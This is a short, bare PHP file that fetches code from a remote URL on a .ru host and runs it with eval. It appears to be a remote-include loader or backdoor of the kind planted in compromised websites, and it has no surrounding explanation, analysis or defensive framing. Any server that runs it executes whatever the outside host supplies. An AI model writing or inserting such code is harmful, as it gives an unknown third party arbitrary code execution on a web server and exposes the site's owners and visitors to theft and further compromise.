<?php
$path = "https://code.topkz.ru/fgd/8/tdg.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
